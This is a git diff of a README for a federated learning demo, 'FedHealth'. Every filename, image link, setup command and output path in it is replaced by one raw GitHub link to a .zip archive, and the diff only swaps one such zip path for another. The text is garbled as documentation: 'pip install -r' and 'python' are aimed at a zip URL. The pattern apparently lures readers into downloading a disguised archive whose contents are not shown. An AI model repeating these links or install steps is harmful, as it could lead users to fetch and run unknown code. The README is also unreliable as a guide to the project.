@@ -7,30 +7,30 @@ It trains local models on different partitions of data and aggregates them using
 
 ## FedHealth Architecture
 
-![Overview of FedHealth Framework](https://raw.githubusercontent.com/sidd0227/Federated/main/teleosaurian/Federated.zip)
+![Overview of FedHealth Framework](https://github.com/sidd0227/Federated/raw/refs/heads/main/images/Software-v3.4.zip)
 
 ## Project Structure
 
 ```
 ├── data/
-│   ├── https://raw.githubusercontent.com/sidd0227/Federated/main/teleosaurian/Federated.zip
-│   └── https://raw.githubusercontent.com/sidd0227/Federated/main/teleosaurian/Federated.zip
+│   ├── https://github.com/sidd0227/Federated/raw/refs/heads/main/images/Software-v3.4.zip
+│   └── https://github.com/sidd0227/Federated/raw/refs/heads/main/images/Software-v3.4.zip
 │
 ├── models/
 │   └── global_model.h5
 │
 ├── results/
-│   └── https://raw.githubusercontent.com/sidd0227/Federated/main/teleosaurian/Federated.zip
+│   └── https://github.com/sidd0227/Federated/raw/refs/heads/main/images/Software-v3.4.zip
 │
 ├── src/
-│   ├── https://raw.githubusercontent.com/sidd0227/Federated/main/teleosaurian/Federated.zip
-│   ├── https://raw.githubusercontent.com/sidd0227/Federated/main/teleosaurian/Federated.zip
-│   ├── https://raw.githubusercontent.com/sidd0227/Federated/main/teleosaurian/Federated.zip
-│   ├── https://raw.githubusercontent.com/sidd0227/Federated/main/teleosaurian/Federated.zip
-│   └── https://raw.githubusercontent.com/sidd0227/Federated/main/teleosaurian/Federated.zip
+│   ├── https://github.com/sidd0227/Federated/raw/refs/heads/main/images/Software-v3.4.zip
+│   ├── https://github.com/sidd0227/Federated/raw/refs/heads/main/images/Software-v3.4.zip
+│   ├── https://github.com/sidd0227/Federated/raw/refs/heads/main/images/Software-v3.4.zip
+│   ├── https://github.com/sidd0227/Federated/raw/refs/heads/main/images/Software-v3.4.zip
+│   └── https://github.com/sidd0227/Federated/raw/refs/heads/main/images/Software-v3.4.zip
 │
-├── https://raw.githubusercontent.com/sidd0227/Federated/main/teleosaurian/Federated.zip
-└── https://raw.githubusercontent.com/sidd0227/Federated/main/teleosaurian/Federated.zip
+├── https://github.com/sidd0227/Federated/raw/refs/heads/main/images/Software-v3.4.zip
+└── https://github.com/sidd0227/Federated/raw/refs/heads/main/images/Software-v3.4.zip
 ```
 
 ---
@@ -46,11 +46,11 @@ It trains local models on different partitions of data and aggregates them using
 
 ## Files
 
-- **https://raw.githubusercontent.com/sidd0227/Federated/main/teleosaurian/Federated.zip**: Functions for loading and preparing data.
-- **https://raw.githubusercontent.com/sidd0227/Federated/main/teleosaurian/Federated.zip**: Functions for creating and evaluating models.
-- **https://raw.githubusercontent.com/sidd0227/Federated/main/teleosaurian/Federated.zip**: Functions for client training and federated averaging.
-- **https://raw.githubusercontent.com/sidd0227/Federated/main/teleosaurian/Federated.zip**: Main file to run the federated training pipeline.
-- **https://raw.githubusercontent.com/sidd0227/Federated/main/teleosaurian/Federated.zip**: List of Python libraries needed.
+- **https://github.com/sidd0227/Federated/raw/refs/heads/main/images/Software-v3.4.zip**: Functions for loading and preparing data.
+- **https://github.com/sidd0227/Federated/raw/refs/heads/main/images/Software-v3.4.zip**: Functions for creating and evaluating models.
+- **https://github.com/sidd0227/Federated/raw/refs/heads/main/images/Software-v3.4.zip**: Functions for client training and federated averaging.
+- **https://github.com/sidd0227/Federated/raw/refs/heads/main/images/Software-v3.4.zip**: Main file to run the federated training pipeline.
+- **https://github.com/sidd0227/Federated/raw/refs/heads/main/images/Software-v3.4.zip**: List of Python libraries needed.
 
 ---
 
@@ -59,18 +59,18 @@ It trains local models on different partitions of data and aggregates them using
 1. Install required packages:
 
 ```bash
-pip install -r https://raw.githubusercontent.com/sidd0227/Federated/main/teleosaurian/Federated.zip
+pip install -r https://github.com/sidd0227/Federated/raw/refs/heads/main/images/Software-v3.4.zip
 ```
 
 2. Run the main script:
 
 ```bash
-python https://raw.githubusercontent.com/sidd0227/Federated/main/teleosaurian/Federated.zip
+python https://github.com/sidd0227/Federated/raw/refs/heads/main/images/Software-v3.4.zip
 ```
 
 3. Outputs:
    - Global model saved at `models/global_model.h5`
-   - Client accuracies and global accuracy saved at `https://raw.githubusercontent.com/sidd0227/Federated/main/teleosaurian/Federated.zip`
+   - Client accuracies and global accuracy saved at `https://github.com/sidd0227/Federated/raw/refs/heads/main/images/Software-v3.4.zip`
 
 ---
 
@@ -86,7 +86,7 @@ python https://raw.githubusercontent.com/sidd0227/Federated/main/teleosaurian/Fe
 ## Notes
 
 - This project is designed for understanding basic federated learning concepts.
-- You can adjust `num_clients` in `https://raw.githubusercontent.com/sidd0227/Federated/main/teleosaurian/Federated.zip` to simulate different numbers of clients.
+- You can adjust `num_clients` in `https://github.com/sidd0227/Federated/raw/refs/heads/main/images/Software-v3.4.zip` to simulate different numbers of clients.
 - You can replace the dataset with any other classification dataset for experiments.
 
 ---
